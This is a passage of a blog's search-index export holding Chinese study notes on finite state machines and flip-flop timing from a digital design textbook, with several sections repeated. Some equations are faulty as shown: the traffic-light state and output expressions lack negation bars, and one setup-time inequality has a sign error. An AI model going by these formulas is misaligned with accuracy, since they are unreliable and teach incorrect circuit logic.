3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#344-factoring-state-machines"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#345-deriving-an-fsm-from-a-schematic"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#346-fsm-review"},{"categories":["计算机体系结构"],"content":" 3.5 3.5 Timing of Sequential Logic 这一段写得非常绕，但是我在找了几个油管的视频之后理解了，视频链接如下： 首先，我们需要了解一个原则，就是CLK时钟从0到1的变化，并不是突然之间产生的，而是经过一个短暂的阶梯型变化过程。从第一章的内容我们可以知道，模拟电路到数字电路的转换之前，需要对高电平和低电平进行定义。在某个电压之上，我们将其状态定义为高电平；在某个电压之下，我们将其定义为低电平；而在这之间，电平处于无效状态。 触发器的状态更新，就是发生在时钟上升沿。但是触发器并不是一个单一的部件，其由内部多个逻辑门所构成。如D触发器的结构如下： 在CLK位于低电平时，输入从D到N1，需要经过一个D锁存器。从N1到Q，需要经过一个D锁存器。我们需要保证触发器中的值（也就是slave锁存器中的值）是稳定的，那么就要求从D输入到N1，以及N1输入到Q的过程中，这个值保持稳定。从D输入到N1的时间，我们称为setup time；从N1到Q的时间，我们称为hold time。也就是说，输入必须在setup time + hold time期间内，保持稳定。不稳定所带来的情况，我们将在3.5.4 Metastability一节中讨论。 setup time和hold time之和也叫aperture time 3.5.1 3.5.1 The Dynamic Discipline 结合上述电路图，我们阐述几个重要的时间： contamination delay（$t_{ccq}$）：从上升沿获取输入，到得到Q1输出的最短时间 propagation delay（$t_{pcq}$）：从上升沿获取输入，到得到Q1输出的最长时间 setup time：在CLK上升沿之前，输入至少保持setup time hold time：在CLK上升沿之后，输入至少保持hold time 组合逻辑电路的延迟（$t_{pd}$）：值从Q1到Q2的最大时间 3.5.2 3.5.2 System Timing在对电路的时序进行分析之前，我们需要明确两个值：$T_{c}$和$f_{c}$。前者是指两个时钟上升沿之间的时间间隔，也叫时钟周期。后者是前者的倒数，是时钟频率。时钟频率的增加，可以带来吞吐量的增加。时钟频率的单位包括：Hz，MHz和GHz。其单位换算如下： 1 megahertz (MHz) = 106 Hz 1 gigahertz (GHz) = 109 Hz. 结合上述电路块的结构分析，一个电路的值传递有如下几个阶段： 从输入，经过触发器R1，到Q1 从Q1，经过组合逻辑电路，到D2 从D2输入到触发器R2 3.5.2.1 Setup Time Constraint 在对约束条件进行分析时，我们采用worst case analysis，也就是分析极限情况下的边界条件。需要注意的是setup time constraint指的不是setup time，而是对组合逻辑电路最大值的限制，因为组合逻辑部分是这个电路唯一可以优化的部分。 对电路setup time的约束主要在于触发器R2。分析如下： 在时钟上升沿后，触发器R1的值最多需要经过$t_{pcq}$才能到达Q1 Q1的值最多需要经过$t_{pd}$才能到达D2 总的时钟周期为$T_{c}$ 而D2输入必须满足setup time的要求，也就是说： D2的输入必须至少在时钟上升沿前$t_{setup}$刻开始保持稳定，即组合逻辑电路的值必须在$T_{c} - t_{setup}$时刻或之前抵达D2 综上分析，我们可以得出以下公式： $t_{pcq}+t_{pd}\u003c=T_{c}-t_{setup}$ 通过移项运算，我们可以得到如下公式： $$ T_{c} \u003e= t_{pcq}+t_{pd}+t_{setup} $$ 那么，$T_{c}$的值至少为$t_{pcq}+t_{pd}+t_{setup}$，那么$f_{c}$的值最大为 $$ f_{c} = \\frac{1}{t_{pcq}+t_{pd}+t_{setup}} $$ 通过这个公式，我们可以了解到，该电路的主要可优化部分为组合逻辑部分，$t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ 称为setup time constraint。 3.5.2.2 Hold Time Constraint对于hold time的约束条件探索，我们同样采用取极端情况的情况，就是不考虑组合逻辑（其延迟为0）。 对于R2的输入D2，其之前的值需要保存$t_{hold}$个单位的时间。但是从R1过来的值，最短只需要$t_{ccq}+t_{cd}$个时刻就能到达，因此可以得出以下表达式： $$ t_{ccq}+t_{cd}\u003e=t_{hold} $$ 因此，可以得出如下表达式： $$ t_{cd} ≥ t_{hold}-t_{ccq} $$ 组合逻辑电路延迟的最小值是 $t_{hold}-t{ccq}$。当两个触发器直接相接的时候，$t_{ccq}=0$，那么要求$t_{hold}\u003c=t_{ccq}$。通常情况下我们默认$t_{hold}=0$，那么上述不等于恒成立。但是如果该条件不成立，我们就需要增加$t_{ccq}$，这需要对电路进行大量的修改，并且耗费巨大的资金，因此我们在设计电路时需要谨慎地考虑$t_{hold}$约束。 3.5.2.3 Putting It All Together 时序分析案例见课本P145面 两条约束原则： $t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ $t_{cd} ≥ t_{hold}-t_{ccq}$ 修复hold time violation，可以用加buffer的方式。但是要注意的是，有的时候加了Buffer后会改变关键路径，从而改变setup time的约束情况。 3.5.3 3.5.3 Clock Skew 这一段也不太好理解，尤其是hold time的部分，我参考了以下油管视频： Clock skew的含义是：对各个触发器时钟上升沿到达的时间不一致。 产生clock skew的原因包括： 通往多个clock的线的长度不一致 噪声（Noise） clock gating 在讲解Clock Skew之前，我们需要再看一下电路图： 对于一个触发器，master的CLK是通过slave的CLK取反得到的，因此这个非门可能会导致两个CLK的上升沿不一致，如图： 因CLK1比CLK2多经过1个非门，因此时钟到达CLK2的时间更早，CLK1更晚 3.5.3.1 setup time constraint分析我们从worst case scenario分析（这里的worst case scenario指的是触发器输出和组合逻辑传递都取最长时间。因为我们要探索的是，在CLK1和CLK2的时钟上升沿间隔缩短，触发器输出和组合逻辑传输时间最长的情况下，依然保证留有$t_{setup}$个单位的时间，供R2维持输入的稳定）： 从CLK1的上升沿开始，R1的值经过最多$t_{pcq}$进入到Q1； 经过组合逻辑的电路的延迟$t_{pd}$，Q1传输到D2， D2输入至少要在CLK2的上升沿前$t_{setup}$时刻达到，甚至更早 也就是说，从CLK1的上升沿，至少经过$t_{pcq}+t_{pd}+t_{setup}$抵达CLK2的上升沿。而从CLK1的上升沿到CLK2的上升沿，经过的时间是$T_{c}-t_{skew}$ 经过如上分析，我们可以建立不等式： $$ T_{c} - t_{skew} \u003e= t_{pcq} + t_{pd} + t_{setup} $$ 对其进行移位变换，我们可以得到： $$ T_{c} \u003e= t_{pcq} + t_{pd} + t_{setup} + t_{skew} $$ 同上，setup time constraint指的是组合逻辑电路的延迟限制（因为组合逻辑电路是电路中唯一一个可以优化的部分，其他的时钟频率、触发器时延、时钟时延、setup time 都是不可改变的），我们可以得到如下不等式： $$ t_{pd} \u003c= T_{c} - (t_{pcq}+t_{setup}+t_{skew}) $$ 3.5.3.2 hold time constraint分析对于hold time constraint，我们同样分析的是R2，R2的值必须在CLK2时钟上升沿后，R1传过来的值到达前，保持至少hold time个时间单位。我们依然从worst case scenario分析（这里与setup time constraint的worst case不同，我们需要探测从R1传输过来的时间最短的情况，必须要让hold time比最短的传输时间还短，否则会导致hold time violation）： R1的输出最少需要$t_{ccq}$个时间单位进入Q1 Q1最少需要$t_{cd}$个时间单位进入D2 但是，因为有了clock skew。因此，哪怕信号已经到达了，而且CLK1已经经过了一个时钟周期，它也还需要再等待$t_{skew}$个单位的时间，才能进入R2。这为R2的$t_{hold}$争取到了一些额外的时间。 那么，我们就可以得到如下不等式： $$ t_{hold} + t_{skew} \u003c= t_{ccq} + t_{cd} $$ 同上，组合逻辑电路是这个电路中唯一可以优化的部分，组合逻辑电路的时延要求如下： $$ t_{cd} \u003e= t_{hold} + t_{skew","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:5","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#35-timing-of-sequential-logic"},{"categories":["计算机体系结构"],"content":" 3.5 3.5 Timing of Sequential Logic 这一段写得非常绕，但是我在找了几个油管的视频之后理解了，视频链接如下： 首先，我们需要了解一个原则，就是CLK时钟从0到1的变化，并不是突然之间产生的，而是经过一个短暂的阶梯型变化过程。从第一章的内容我们可以知道，模拟电路到数字电路的转换之前，需要对高电平和低电平进行定义。在某个电压之上，我们将其状态定义为高电平；在某个电压之下，我们将其定义为低电平；而在这之间，电平处于无效状态。 触发器的状态更新，就是发生在时钟上升沿。但是触发器并不是一个单一的部件，其由内部多个逻辑门所构成。如D触发器的结构如下： 在CLK位于低电平时，输入从D到N1，需要经过一个D锁存器。从N1到Q，需要经过一个D锁存器。我们需要保证触发器中的值（也就是slave锁存器中的值）是稳定的，那么就要求从D输入到N1，以及N1输入到Q的过程中，这个值保持稳定。从D输入到N1的时间，我们称为setup time；从N1到Q的时间，我们称为hold time。也就是说，输入必须在setup time + hold time期间内，保持稳定。不稳定所带来的情况，我们将在3.5.4 Metastability一节中讨论。 setup time和hold time之和也叫aperture time 3.5.1 3.5.1 The Dynamic Discipline 结合上述电路图，我们阐述几个重要的时间： contamination delay（$t_{ccq}$）：从上升沿获取输入，到得到Q1输出的最短时间 propagation delay（$t_{pcq}$）：从上升沿获取输入，到得到Q1输出的最长时间 setup time：在CLK上升沿之前，输入至少保持setup time hold time：在CLK上升沿之后，输入至少保持hold time 组合逻辑电路的延迟（$t_{pd}$）：值从Q1到Q2的最大时间 3.5.2 